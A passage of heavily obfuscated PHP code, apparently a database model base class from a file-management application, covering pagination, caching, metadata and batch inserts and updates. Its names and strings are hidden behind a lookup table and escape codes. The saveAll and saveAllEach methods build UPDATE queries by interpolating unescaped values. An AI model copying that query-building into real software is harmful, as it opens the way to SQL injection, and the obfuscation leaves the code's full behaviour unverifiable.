(is_string($ç¡¥¬¯˜) && $Æ¹ïÈË¡[12] != $ç¡¥¬¯˜) { $ÁìÁ¶Åæ = array(); $ÁìÁ¶Åæ[$Æ¹ïÈË¡[356]] = $ç¡¥¬¯˜; $ç¡¥¬¯˜ = $ÁìÁ¶Åæ; } if (isset($this->options[$Æ¹ïÈË¡[279]])) { $this->options[$Æ¹ïÈË¡[279]] = array_merge($this->options[$Æ¹ïÈË¡[279]], $ç¡¥¬¯˜); } else { $this->options[$Æ¹ïÈË¡[279]] = $ç¡¥¬¯˜; } return $this; } public function limit($ÄÊÅôü¸, $£Î€“Ê = null) { $ğâ÷òû  =& $_SERVER[¥Ÿ©ÒèÌ]; $this->options[$ğâ÷òû [296]] = is_null($£Î€“Ê) ? $ÄÊÅôü¸ : $ÄÊÅôü¸ . $ğâ÷òû [50] . $£Î€“Ê; return $this; } public function page($úçÕ±áŒ, $–¤¤Øˆ = null) { $ù¹î«»İ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->options[$ù¹î«»İ[357]] = is_null($–¤¤Øˆ) ? $úçÕ±áŒ : $úçÕ±áŒ . $ù¹î«»İ[50] . $–¤¤Øˆ; return $this; } public function comment($öŞôÑ) { $this->options[$_SERVER[¥Ÿ©ÒèÌ][358]] = $öŞôÑ; return $this; } public function setProperty($·Õ»®üÉ, $ÏñË¨«Ê) { if (property_exists($this, $·Õ»®üÉ)) { $this->{$·Õ»®üÉ} = $ÏñË¨«Ê; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\x54\151\x6d\x65", "\164\151\x6d\145", "\151\x6e\x73\x65\162\164\x2c\165\160\144\x61\164\x65", "\146\x75\156\x63\x74\x69\157\x6e"), array("\x63\162\145\141\x74\x65\124\x69\155\x65", "\x74\x69\155\x65", "\x69\x6e\x73\145\162\164", "\x66\165\x6e\x63\x74\151\157\156")); public function setDataAuto($¶“Åùğ) { $this->dataAuto = $¶“Åùğ; } public function __construct($œ²Í³Çî = '', $±Ç“ı™Ÿ = '', $¼ïğàÃ = '') { parent::__construct($œ²Í³Çî, $±Ç“ı™Ÿ, $¼ïğàÃ); } protected $tableMeta = array(); protected function _beforeInsert(&$š‰æÆßÃ, $³›Í„Ã‘) { $¾ñ¢ëËˆ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->checkDataAutoHas($¾ñ¢ëËˆ[359])) { return; } $this->dataBeforeFilter($š‰æÆßÃ, $¾ñ¢ëËˆ[359]); } protected function _beforeUpdate(&$ı„ËÏã«, $ÖŞèªÛÛ) { $‘î¾œ‚• =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->checkDataAutoHas($‘î¾œ‚•[360])) { return; } $this->dataBeforeFilter($ı„ËÏã«, $‘î¾œ‚•[360]); } protected function _afterSelect(&$¢ëĞÛä, $–˜Ì‡³Á) { if (!is_array($¢ëĞÛä)) { return; } if (!$this->checkDataAutoHas($_SERVER[¥Ÿ©ÒèÌ][361])) { return; } foreach ($¢ëĞÛä as &$‘Ü³ºÜ) { $this->dataAfterFilter($‘Ü³ºÜ); } unset($‘Ü³ºÜ); } protected function _afterFind(&$Ç›Åâ÷Ö, $›‹ËÓÆ›) { if (!is_array($Ç›Åâ÷Ö)) { return; } if (!$this->checkDataAutoHas($_SERVER[¥Ÿ©ÒèÌ][361])) { return; } $this->dataAfterFilter($Ç›Åâ÷Ö); } public static function textEncode($®Ó·Äõ›) { if (!$®Ó·Äõ›) { return $®Ó·Äõ›; } $ïäÌğ¨ê = json_encode($®Ó·Äõ›); $ïäÌğ¨ê = preg_replace_callback($_SERVER[¥Ÿ©ÒèÌ][362], function ($™İ¹ÂÎƒ) { return addslashes($™İ¹ÂÎƒ[0]); }, $ïäÌğ¨ê); return json_decode($ïäÌğ¨ê); } public static function textDecode($ì©‹ ˜¾) { $Œ‡üíç­ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ûİ´‡í” = json_encode($ì©‹ ˜¾); $Ûİ´‡í” = preg_replace_callback($Œ‡üíç­[363], function ($§Öºáæˆ) { return $_SERVER[¥Ÿ©ÒèÌ][98]; }, $Ûİ´‡í”); return json_decode($Ûİ´‡í”); } public function setAutoIncrement($ßüä’ş®) { $ªš¨ˆØ¥ = array($this->getPk() => $ßüä’ş®); $¾¹Ë·†Ô = $this->data($ªš¨ˆØ¥)->add(); if ($¾¹Ë·†Ô) { $this->delete($¾¹Ë·†Ô); } } public function getAutoIncrement() { $ÉÔğØª¯ = $this->getTableName(); $©ì¸Ìµ = $this->max($this->getPk()); $–•¨üàÅ = $this->query("\x73\150\x6f\167\40\x74\141\x62\154\145\x20\163\164\141\x74\x75\163\x20\x77\150\x65\162\145\40\x4e\x61\x6d\x65\x3d\47{$ÉÔğØª¯}\47"); $‚ÛÑ³„Õ = $–•¨üàÅ[0][$_SERVER[¥Ÿ©ÒèÌ][364]]; $¨àáÄ²å = max($©ì¸Ìµ, $‚ÛÑ³„Õ); return $¨àáÄ²å; } protected function _callBefore($©Š¤€¤£, $—ø•¼€§) { return $this->cacheCallCheck($©Š¤€¤£, $—ø•¼€§, !1); } protected function _callAfter($ş¹ª², $‹Ö«çº) { return $this->cacheCallCheck($ş¹ª², $‹Ö«çº, !0); } protected function cacheFunctionAlias($£¨™æ…ß) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($µ¸À¾Å, $œ™ “Éö, $¡¾å²èÏ = false) { $·íÇ¾œ€ = $this->cacheFunctionAlias($œ™ “Éö); if (!$·íÇ¾œ€) { return; } foreach ($·íÇ¾œ€ as $™ ¯Ğ«´ => $ş¾­ à) { $íÎÖÓšƒ = $ş¾­ à[0]; $µÕç¾£¸ = explode($_SERVER[¥Ÿ©ÒèÌ][50], $ş¾­ à[1]); if ($µ¸À¾Å == $™ ¯Ğ«´) { return $this->cacheFunctionGet($™ ¯Ğ«´, $íÎÖÓšƒ); } if ($¡¾å²èÏ && in_array($µ¸À¾Å, $µÕç¾£¸)) { $this->cacheFunctionClear($™ ¯Ğ«´, $íÎÖÓšƒ); } } } public function cacheFunctionGet($¿÷¥¸Ÿ÷, $ÛÅ¦) { $¼¨ÏşÈÛ = $this->cacheKeyMake($¿÷¥¸Ÿ÷, $ÛÅ¦); $ÇŠ¿Œøš = Cache::get($¼¨ÏşÈÛ); if (!is_array($ÇŠ¿Œøš)) { $ÇŠ¿Œøš = call_user_func_array(array($this, $¿÷¥¸Ÿ÷), array($ÛÅ¦, !0)); Cache::set($¼¨ÏşÈÛ, $ÇŠ¿Œøš); } return $ÇŠ¿Œøš; } public function cacheFunctionClear($á´µÏ®í, $ã“åÕÙ‚) { $—„Ù€–á = $ã“åÕÙ‚; if (!is_array($ã“åÕÙ‚)) { $—„Ù€–á = array($ã“åÕÙ‚); } foreach ($—„Ù€–á as $İ¹É‡Ã¦) { $ôÄùÅÅÕ = $this->cacheKeyMake($á´µÏ®í, $İ¹É‡Ã¦); Cache::remove($ôÄùÅÅÕ); } } private function cacheKeyMake($Òé‘£²¦, $³‹ôó ø) { $Öûö¾Ğ =& $_SERVER[¥Ÿ©ÒèÌ]; return get_class($this) . $Öûö¾Ğ[11] . $Òé‘£²¦ . $Öûö¾Ğ[365] . $³‹ôó ø; } protected function selectPageReset() { $Ğûãôâ =& $_SERVER[¥Ÿ©ÒèÌ]; if (isset($GLOBALS[$Ğûãôâ[366]])) { return; } $GLOBALS[$Ğûãôâ[366]] = isset($GLOBALS[$Ğûãôâ[7]][$Ğûãôâ[367]]) ? $GLOBALS[$Ğûãôâ[7]][$Ğûãôâ[367]] : !1; $GLOBALS[$Ğûãôâ[368]] = isset($GLOBALS[$Ğûãôâ[7]][$Ğûãôâ[357]]) ? $GLOBALS[$Ğûãôâ[7]][$Ğûãôâ[357]] : !1; $GLOBALS[$Ğûãôâ[7]][$Ğûãôâ[367]] = !1; $GLOBALS[$Ğûãôâ[7]][$Ğûãôâ[357]] = !1; } protected function selectPageRestore() { $½ˆ¹ù’û =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($GLOBALS[$½ˆ¹ù’û[366]])) { return; } $GLOBALS[$½ˆ¹ù’û[7]][$½ˆ¹ù’û[367]] = $GLOBALS[$½ˆ¹ù’û[366]]; $GLOBALS[$½ˆ¹ù’û[7]][$½ˆ¹ù’û[357]] = $GLOBALS[$½ˆ¹ù’û[368]]; if ($GLOBALS[$½ˆ¹ù’û[7]][$½ˆ¹ù’û[367]] === !1) { unset($GLOBALS[$½ˆ¹ù’û[7]][$½ˆ¹ù’û[367]]); } if ($GLOBALS[$½ˆ¹ù’û[7]][$½ˆ¹ù’û[357]] === !1) { unset($GLOBALS[$½ˆ¹ù’û[7]][$½ˆ¹ù’û[357]]); } unset($GLOBALS[$½ˆ¹ù’û[366]]); unset($GLOBALS[$½ˆ¹ù’û[368]]); } protected function selectPage($ñ¿ú³·Ñ = 200, $»ÀØÛÕ˜ = 1) { $ºÄÚíôà =& $_SERVER[¥Ÿ©ÒèÌ]; global $in; $ŠèŒ›…  = $this->optionsValue(); $û¨ä°¥— = 50000; $ñ¿ú³·Ñ = isset($in[$ºÄÚíôà[367]]) && $in[$ºÄÚíôà[367]] ? $in[$ºÄÚíôà[367]] : $ñ¿ú³·Ñ; if ($ñ¿ú³·Ñ === -1) { $in[$ºÄÚíôà[367]] = !1; $û¨ä°¥— = 100000000; $ñ¿ú³·Ñ = $û¨ä°¥—; } $üİÚ“Ø• = $ŠèŒ›… ; $üİÚ“Ø•[$ºÄÚíôà[369]] = array(); $ñ¿ú³·Ñ = intval($ñ¿ú³·Ñ); $ñ¿ú³·Ñ = $ñ¿ú³·Ñ <= 5 ? 5 : ($ñ¿ú³·Ñ >= $û¨ä°¥— ? $û¨ä°¥— : $ñ¿ú³·Ñ); $»ÀØÛÕ˜ = intval(isset($in[$ºÄÚíôà[357]]) && $in[$ºÄÚíôà[357]] ? $in[$ºÄÚíôà[357]] : $»ÀØÛÕ˜); $»ÀØÛÕ˜ = $»ÀØÛÕ˜ <= 1 ? 1 : $»ÀØÛÕ˜; $àÉª±Ú = array(); $ÃÁûù¸ = 1; if ($»ÀØÛÕ˜ == 1 && $ÃÁûù¸) { $this->optionsValue($ŠèŒ›… ); $àÉª±Ú = $this->page($»ÀØÛÕ˜, $ñ¿ú³·Ñ)->select(); $î¡¤Ğ«í = is_array($àÉª±Ú) ? count($àÉª±Ú) : 0; if ($î¡¤Ğ«í < $ñ¿ú³·Ñ) { $òû’ÌÎ = 1; } else { $this->optionsValue($üİÚ“Ø•); $î¡¤Ğ«í = intval($this->count()); $òû’ÌÎ = ceil($î¡¤Ğ«í / $ñ¿ú³·Ñ); } } else { $this->optionsValue($üİÚ“Ø•); $î¡¤Ğ«í = intval($this->count()); $òû’ÌÎ = ceil($î¡¤Ğ«í / $ñ¿ú³·Ñ); $»ÀØÛÕ˜ = $»ÀØÛÕ˜ >= $òû’ÌÎ ? $òû’ÌÎ : $»ÀØÛÕ˜; $this->optionsValue($ŠèŒ›… ); $àÉª±Ú = $this->page($»ÀØÛÕ˜, $ñ¿ú³·Ñ)->select(); } if (!is_array($àÉª±Ú)) { $àÉª±Ú = array(); } if ($òû’ÌÎ == 1) { $î¡¤Ğ«í = count($àÉª±Ú); } $³ÀÓÙ…Ø = array($ºÄÚíôà[370] => array($ºÄÚíôà[371] => $î¡¤Ğ«í, $ºÄÚíôà[367] => $ñ¿ú³·Ñ, $ºÄÚíôà[357] => $»ÀØÛÕ˜, $ºÄÚíôà[372] => $òû’ÌÎ), $ºÄÚíôà[373] => $àÉª±Ú); return $³ÀÓÙ…Ø; } protected function checkLength($ˆ½‚Å’¿, $‚ªŠ‡ëŸ = 0, $Öğşé®× = '') { $½…ñè•† =& $_SERVER[¥Ÿ©ÒèÌ]; $‚ªŠ‡ëŸ = $‚ªŠ‡ëŸ ? $‚ªŠ‡ëŸ : 65536; if (!$ˆ½‚Å’¿ || strlen($ˆ½‚Å’¿) < $‚ªŠ‡ëŸ) { return; } $Öğşé®× = $Öğşé®× ? $Öğşé®× . $½…ñè•†[71] : $½…ñè•†[12]; show_json($Öğşé®× . LNG($½…ñè•†[374]) . "\x28{$‚ªŠ‡ëŸ}\51", !1); } protected function metaSet($âÁâ¾‘, $êŒ–ú = null, $„ëä‘Ü‰ = null) { $ì¤şÍ ö =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->tableMeta || !$âÁâ¾‘) { return !1; } $ç¢§í¬© = $this->tableMeta[$ì¤şÍ ö[375]]; $òÄ’è§ß = $this->tableMeta[$ì¤şÍ ö[376]]; $—¿·²ôü = Model($òÄ’è§ß); $ßÂ¥¹ÖÏ = array($ç¢§í¬© => $âÁâ¾‘, $ì¤şÍ ö[377] => $êŒ–ú); if (is_null($êŒ–ú)) { return $—¿·²ôü->where(array($ç¢§í¬© => $âÁâ¾‘))->delete(); } if (is_null($„ëä‘Ü‰) && is_string($êŒ–ú)) { return $—¿·²ôü->where($ßÂ¥¹ÖÏ)->delete(); } $ÁÌ‡³ş¤ = is_array($êŒ–ú) ? $êŒ–ú : array(); if (is_string($êŒ–ú)) { $ÁÌ‡³ş¤[$êŒ–ú] = $„ëä‘Ü‰; } $¶ÃÌìá“ = array(); foreach ($ÁÌ‡³ş¤ as $¹¸şê => $°Ô„¯Í÷) { if (is_null($°Ô„¯Í÷) && is_string($¹¸şê)) { $—¿·²ôü->where(array($ç¢§í¬© => $âÁâ¾‘, $ì¤şÍ ö[377] => $¹¸şê))->delete(); continue; } $this->checkLength($°Ô„¯Í÷, !1, $òÄ’è§ß . $ì¤şÍ ö[4] . $¹¸şê); $¶ÃÌìá“[] = array($ç¢§í¬© => $âÁâ¾‘, $ì¤şÍ ö[95] => $¹¸şê, $ì¤şÍ ö[378] => $°Ô„¯Í÷); } $ÌÀãÍÛÍ = $ì¤şÍ ö[379] . $òÄ’è§ß; CacheLock::lock($ÌÀãÍÛÍ); $—¿·²ôü->where(array($ç¢§í¬© => $âÁâ¾‘))->addAll($¶ÃÌìá“, array(), !0); CacheLock::unlock($ÌÀãÍÛÍ); return !0; } public function metaGet($ÇµìÆ±û, $ö€½Äş› = false) { $¹øâ¦ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->tableMeta) { return array(); } $­™µ™“ñ = $this->tableMeta[$¹øâ¦[375]]; $şâá’€É = Model($this->tableMeta[$¹øâ¦[376]]); if ($ö€½Äş›) { $×°™º’è = array($­™µ™“ñ => $ÇµìÆ±û, $¹øâ¦[95] => $ö€½Äş›); return $şâá’€É->where($×°™º’è)->getField($¹øâ¦[378]); } $×°™º’è = array($­™µ™“ñ => $ÇµìÆ±û); $è¸óÂ…½ = $şâá’€É->field($¹øâ¦[380])->where($×°™º’è)->select(); $è¸óÂ…½ = array_to_keyvalue($è¸óÂ…½, $¹øâ¦[95], $¹øâ¦[378]); return $è¸óÂ…½; } private function checkDataAutoHas($•ƒ¾¿·ª) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $­ıšİªÎ) { if (in_array($•ƒ¾¿·ª, explode($_SERVER[¥Ÿ©ÒèÌ][50], $­ıšİªÎ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Ø¤ï¹Ë, $ƒŒ’§Ô) { $Ş¤‚Í® =& $_SERVER[¥Ÿ©ÒèÌ]; if (!is_array($Ø¤ï¹Ë)) { return; } foreach ($this->dataAuto as $ßÀñ•±Ü) { $Ù´Õ¸±÷ = $ßÀñ•±Ü[0]; if (!in_array($ƒŒ’§Ô, explode($Ş¤‚Í®[50], $ßÀñ•±Ü[2]))) { continue; } switch (trim($ßÀñ•±Ü[3])) { case $Ş¤‚Í®[325]: case $Ş¤‚Í®[326]: $ˆ­‡Œ§© = $ßÀñ•±Ü[1]; $é…¿’Šö = isset($ßÀñ•±Ü[4]) ? (array) $ßÀñ•±Ü[4] : array(); if ($ˆ­‡Œ§© == $Ş¤‚Í®[196] && array_key_exists($Ù´Õ¸±÷, $Ø¤ï¹Ë)) { if (!$Ø¤ï¹Ë[$Ù´Õ¸±÷]) { unset($Ø¤ï¹Ë[$Ù´Õ¸±÷]); } break; } if (isset($Ø¤ï¹Ë[$Ù´Õ¸±÷])) { array_unshift($é…¿’Šö, $Ø¤ï¹Ë[$Ù´Õ¸±÷]); } if ($Ş¤‚Í®[325] == $ßÀñ•±Ü[3]) { $Ø¤ï¹Ë[$Ù´Õ¸±÷] = call_user_func_array($ˆ­‡Œ§©, $é…¿’Šö); } else { $Ø¤ï¹Ë[$Ù´Õ¸±÷] = call_user_func_array(array(&$this, $ˆ­‡Œ§©), $é…¿’Šö); } break; case $Ş¤‚Í®[274]: if (isset($Ø¤ï¹Ë[$Ù´Õ¸±÷]) && $Ø¤ï¹Ë[$Ù´Õ¸±÷]) { $Ø¤ï¹Ë[$Ù´Õ¸±÷] = call_user_func_array(array(&$this, $ßÀñ•±Ü[1]), array($Ø¤ï¹Ë[$Ù´Õ¸±÷])); } break; case $Ş¤‚Í®[277]: $Ø¤ï¹Ë[$Ù´Õ¸±÷] = $Ø¤ï¹Ë[$ßÀñ•±Ü[1]]; break; case $Ş¤‚Í®[298]: if (isset($Ø¤ï¹Ë[$Ù´Õ¸±÷]) && !is_string($Ø¤ï¹Ë[$Ù´Õ¸±÷])) { $Ø¤ï¹Ë[$Ù´Õ¸±÷] = json_encode_force($Ø¤ï¹Ë[$Ù´Õ¸±÷]); } break; case $Ş¤‚Í®[327]: if ($Ø¤ï¹Ë[$Ù´Õ¸±÷] === $Ş¤‚Í®[12]) { unset($Ø¤ï¹Ë[$Ù´Õ¸±÷]); } break; case $Ş¤‚Í®[328]: $Ø¤ï¹Ë[$Ù´Õ¸±÷] = $ßÀñ•±Ü[1]; default: break; } } if ($ƒŒ’§Ô == $Ş¤‚Í®[359]) { $¥Àæœ­ = strtolower($this->db->getDbType()); if (strpos($¥Àæœ­, $Ş¤‚Í®[13]) !== 0) { return; } $ì•Û›¤Û = $this->field(!0)->fields; $èåäÙé° = $ì•Û›¤Û[$Ş¤‚Í®[256]]; if (isset($ì•Û›¤Û[$Ş¤‚Í®[255]])) { unset($èåäÙé°[$ì•Û›¤Û[$Ş¤‚Í®[255]]]); } foreach ($èåäÙé° as $áµÊª™È => $ƒŒ’§Ô) { if (!isset($Ø¤ï¹Ë[$áµÊª™È])) { $Ø¤ï¹Ë[$áµÊª™È] = $Ş¤‚Í®[12]; } } } } private function dataAfterFilter(&$Û–Î§œı) { $¯…÷à¡Ö =& $_SERVER[¥Ÿ©ÒèÌ]; foreach ($this->dataAuto as $şØÜ‘½Ë) { $ë›ëÔÓ® = $şØÜ‘½Ë[0]; if (!isset($Û–Î§œı[$ë›ëÔÓ®])) { continue; } if (!in_array($¯…÷à¡Ö[361], explode($¯…÷à¡Ö[50], $şØÜ‘½Ë[2]))) { continue; } switch (trim($şØÜ‘½Ë[3])) { case $¯…÷à¡Ö[325]: case $¯…÷à¡Ö[326]: $¾÷Òú£‰ = isset($şØÜ‘½Ë[4]) ? (array) $şØÜ‘½Ë[4] : array(); array_unshift($¾÷Òú£‰, $Û–Î§œı[$ë›ëÔÓ®]); if (isset($şØÜ‘½Ë[4]) && $şØÜ‘½Ë[4] == $¯…÷à¡Ö[381]) { $¾÷Òú£‰ = array($Û–Î§œı[$ë›ëÔÓ®]); } if ($¯…÷à¡Ö[325] == $şØÜ‘½Ë[3]) { $Û–Î§œı[$ë›ëÔÓ®] = call_user_func_array($şØÜ‘½Ë[1], $¾÷Òú£‰); } else { $Û–Î§œı[$ë›ëÔÓ®] = call_user_func_array(array(&$this, $şØÜ‘½Ë[1]), $¾÷Òú£‰); } break; case $¯…÷à¡Ö[274]: if (isset($Û–Î§œı[$ë›ëÔÓ®]) && $Û–Î§œı[$ë›ëÔÓ®]) { $Û–Î§œı[$ë›ëÔÓ®] = call_user_func_array(array(&$this, $şØÜ‘½Ë[1]), array($Û–Î§œı[$ë›ëÔÓ®])); } break; case $¯…÷à¡Ö[277]: $Û–Î§œı[$ë›ëÔÓ®] = $Û–Î§œı[$şØÜ‘½Ë[1]]; break; case $¯…÷à¡Ö[298]: $ËÅ¸Ø± = $Û–Î§œı[$ë›ëÔÓ®]; $Û–Î§œı[$ë›ëÔÓ®] = json_decode($ËÅ¸Ø±, !0); if (is_null($Û–Î§œı[$ë›ëÔÓ®])) { $Û–Î§œı[$ë›ëÔÓ®] = $ËÅ¸Ø±; } break; case $¯…÷à¡Ö[327]: if ($Û–Î§œı[$ë›ëÔÓ®] === $¯…÷à¡Ö[12]) { unset($Û–Î§œı[$ë›ëÔÓ®]); } break; case $¯…÷à¡Ö[328]: $Û–Î§œı[$ë›ëÔÓ®] = $şØÜ‘½Ë[1]; break; default: break; } } } public function saveAll($ì¤Ô €ô) { $‰Ÿ¨Ñî‚ =& $_SERVER[¥Ÿ©ÒèÌ]; $©ãúâ¯² = $this->tablePrefix . $this->tableName; $ù¤Ÿ Üô = self::SQL_WHERE_IN_CHUNK; $ì¤Ô €ô = is_array($ì¤Ô €ô) ? $ì¤Ô €ô : array(); $—®µÁš‡ = $‰Ÿ¨Ñî‚[382]; $Ä²ã‹ï¾ = 0; $ÕÃŸƒä± = array(); $àçÊøõª = count($ì¤Ô €ô); for ($¿ùä³Ìã = 0; $¿ùä³Ìã < $àçÊøõª; $¿ùä³Ìã++) { $ºËÏÉŸ¼ = $ì¤Ô €ô[$¿ùä³Ìã]; if (!is_array($ºËÏÉŸ¼) || count($ºËÏÉŸ¼) != 4) { continue; } $‹¸÷Ë = "\x55\x50\104\101\124\105\40\x60{$©ãúâ¯²}\x60\x20\x53\105\124\x20{$ºËÏÉŸ¼[2]}\x20\x3d\40\103\x41\123\105\x20{$ºËÏÉŸ¼[0]}\x20\12"; if ($Ä²ã‹ï¾ == 0) { $—®µÁš‡ = $‹¸÷Ë; } $ÕÃŸƒä±[] = $‰Ÿ¨Ñî‚[117] . $ºËÏÉŸ¼[1] . $‰Ÿ¨Ñî‚[117]; $Ä²ã‹ï¾++; $—®µÁš‡ .= "\40\x57\110\105\116\40\x27{$ºËÏÉŸ¼[1]}\x27\40\x54\110\x45\116\40\x27{$ºËÏÉŸ¼[3]}\47\40\12"; if ($Ä²ã‹ï¾ == $ù¤Ÿ Üô || $¿ùä³Ìã == $àçÊøõª - 1) { $¬İÌŞù = implode($‰Ÿ¨Ñî‚[50], $ÕÃŸƒä±); $—®µÁš‡ .= "\40\x45\116\104\x20\x20\x57\x48\105\122\x45\x20{$ºËÏÉŸ¼[0]}\40\x49\x4e\x20\x28{$¬İÌŞù}\x29\x20"; $this->execute($—®µÁš‡); $Ä²ã‹ï¾ = 0; $—®µÁš‡ = $‹¸÷Ë; $this->chunkEventCheck(count($ÕÃŸƒä±)); $ÕÃŸƒä± = array(); } } $this->chunkEventSet(); } public function saveAllEach($ÌÍ§ë¡ƒ) { $º–¤À”Œ =& $_SERVER[¥Ÿ©ÒèÌ]; $²íû€œ = $this->tablePrefix . $this->tableName; foreach ($ÌÍ§ë¡ƒ as $Èœêôã®) { if (!is_array($Èœêôã®) || count($Èœêôã®) != 4) { continue; } $«×æÃ¾ = $Èœêôã®[0] . $º–¤À”Œ[383] . $Èœêôã®[1] . $º–¤À”Œ[117]; $Ù¹šËÄô = $Èœêôã®[2] . $º–¤À”Œ[383] . $Èœêôã®[3] . $º–¤À”Œ[117]; $´‘‘¿Ş˜ = "\165\x70\144\141\164\x65\x20{$²íû€œ}\x20\163\145\x74\x20{$Ù¹šËÄô}\40\167\x68\145\x72\145\40{$«×æÃ¾}\x3b"; $this->execute($´‘‘¿Ş˜); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ê½©Şï” = false, $¦ª´ÈÉğ = false) { $this->_chunkEvent = $ê½©Şï”; $this->_chunkEventParam = $¦ª´ÈÉğ; } private function chunkEventCheck($«èÂÁ…·) { if (!$this->_chunkEvent) { return; } $‚½‹¡Ú­ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $‚½‹¡Ú­[$_SERVER[¥Ÿ©ÒèÌ][384]] = $«èÂÁ…·; Hook::trigger($this->_chunkEvent, $‚½‹¡Ú­); } public function addAll($†¦¡ÂÏè, $¿ò‘Æíú = array(), $ÆèŠ‘–¸ = false) { $üÙê—®‹ =& $_SERVER[¥Ÿ©ÒèÌ]; ignore_timeout(); $Ïôè­Öá = self::SQL_WHERE_IN_CHUNK; if (empty($†¦¡ÂÏè)) { $this->error = think_lang($üÙê—®‹[275]); return !1; } $¿ò‘Æíú = $this->_parseOptions($¿ò‘Æíú); foreach ($†¦¡ÂÏè as $‘…»ÌÚ => $Ê³¸ì·) { $†¦¡ÂÏè[$‘…»ÌÚ] = $this->_facade($Ê³¸ì·); $this->_beforeInsert($†¦¡ÂÏè[$‘…»ÌÚ], $¿ò‘Æíú); } if (method_exists($this->db, $üÙê—®‹[276])) { for ($ÔÜÔíÃ• = 0; $ÔÜÔíÃ• < count($†¦¡ÂÏè); $ÔÜÔíÃ• += $Ïôè­Öá) { $şÛ…İù = array_slice($†¦¡ÂÏè, $ÔÜÔíÃ•, $Ïôè­Öá); if (!is_array($şÛ…İù) || count($şÛ…İù) == 0) { break; } $ÚµŸØµŞ = $this->db->insertAll($şÛ…İù, $¿ò‘Æíú, $ÆèŠ‘–¸); $this->chunkEventCheck(count($şÛ…İù)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($†¦¡ÂÏè as $‘…»ÌÚ => $Ê³¸ì·) { $ÚµŸØµŞ = $this->db->insert($Ê³¸ì·, $¿ò‘Æíú, $ÆèŠ‘–¸); } $this->commit(); } if (!1 !== $ÚµŸØµŞ) { $å¶Å§×é = $this->getLastInsID(); if ($å¶Å§×é) { return $å¶Å§×é; } } return $ÚµŸØµŞ; } public function save($éõØÂ¥µ = '', $—‘›ìÛõ = array()) { $±½¸ÒŞ¿ =& $_SERVER[¥Ÿ©ÒèÌ]; $ñß¾îúô = self::SQL_WHERE_IN_CHUNK; $ËÆè„Î² = $this->optionsValue(); $ú„·ì†ß = $this->findWhereField($ËÆè„Î²); if (!$ú„·ì†ß) { return parent::save($éõØÂ¥µ, $—‘›ìÛõ); } $¬×à‰òå = 0; $¬ÊğĞ = $ËÆè„Î²[$±½¸ÒŞ¿[279]][$ú„·ì†ß][1]; $¬ÊğĞ = is_array($¬ÊğĞ) ? $¬ÊğĞ : array(); $Šù•’‡ = count($¬ÊğĞ); for ($ŞÁşè = 0; $ŞÁşè < $Šù•’‡; $ŞÁşè += $ñß¾îúô) { $† ò´š = array_slice($¬ÊğĞ, $ŞÁşè, $ñß¾îúô); if (!is_array($† ò´š) || count($† ò´š) == 0) { break; } $ËÆè„Î²[$±½¸ÒŞ¿[279]][$ú„·ì†ß][1] = $† ò´š; $this->optionsValue($ËÆè„Î²); $¬×à‰òå += parent::save($éõØÂ¥µ, $—‘›ìÛõ); $this->chunkEventCheck(count($† ò´š)); } $this->chunkEventSet(); return $¬×à‰òå; } public function add($àñ¶á—³ = '', $È¼¦º×× = array(), $”ÖØá§ = false) { if ($this->addTaskStatus && is_array($àñ¶á—³)) { $this->addTaskData[] = $àñ¶á—³; return; } return parent::add($àñ¶á—³, $È¼¦º××, $”ÖØá§); } public function parseWhereLike($ƒŸ…¬„™, $øÛ‡Óëë = '', $ŠÊÔğ· = false, &$‹Àšİ× = false) { $¢üğßŞ€ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÀğÑß½ = $GLOBALS[$¢üğßŞ€[6]][$¢üğßŞ€[385]]; if (!$ÀğÑß½[$¢üğßŞ€[386]]) { return $ƒŸ…¬„™; } if (!is_array($ƒŸ…¬„™)) { return $ƒŸ…¬„™; } $öéÕ÷Õó = array(); $†Å²±Î = 0; foreach ($ƒŸ…¬„™ as $˜Üè‘Ä => $§ìÑÀÒ) { if (is_array($§ìÑÀÒ) && count($§ìÑÀÒ) == 2 && $§ìÑÀÒ[0] == $¢üğßŞ€[387] && is_string($§ìÑÀÒ[1]) && substr($§ìÑÀÒ[1], 0, 1) == $¢üğßŞ€[388] && substr($§ìÑÀÒ[1], strlen($§ìÑÀÒ[1]) - 1, 1) == $¢üğßŞ€[388]) { $‹Àšİ× = !0; $²çùãæõ = is_string($˜Üè‘Ä) ? $˜Üè‘Ä : $øÛ‡Óëë; $¯İ‰ª·ˆ = substr($§ìÑÀÒ[1], 1, strlen($§ìÑÀÒ[1]) - 2); $¯İ‰ª·ˆ = $this->db->escapeString($¯İ‰ª·ˆ); if (!strpos($²çùãæõ, $¢üğßŞ€[10])) { $²çùãæõ = $¢üğßŞ€[389] . $²çùãæõ . $¢üğßŞ€[389]; } $ÅÕÔì‰† = $¢üğßŞ€[181] . $¯İ‰ª·ˆ . $¢üğßŞ€[181]; if ($ÀğÑß½[$¢üğßŞ€[390]]) { $ÅÕÔì‰† = $¢üğßŞ€[391] . $¯İ‰ª·ˆ . $¢üğßŞ€[392]; if ($ÀğÑß½[$¢üğßŞ€[393]]) { $ÅÕÔì‰† = $¢üğßŞ€[392] . $¯İ‰ª·ˆ . $¢üğßŞ€[391]; } } $öéÕ÷Õó[$†Å²±Î] = $¢üğßŞ€[394] . $²çùãæõ . $¢üğßŞ€[395] . $ÅÕÔì‰† . $¢üğßŞ€[396]; $†Å²±Î++; continue; } if (is_array($§ìÑÀÒ)) { $øÛ‡Óëë = is_string($˜Üè‘Ä) ? $˜Üè‘Ä : $øÛ‡Óëë; $§ìÑÀÒ = $this->parseWhereLike($§ìÑÀÒ, $øÛ‡Óëë, !0, $‹Àšİ×); } if (is_numeric($˜Üè‘Ä)) { $öéÕ÷Õó[$†Å²±Î] = 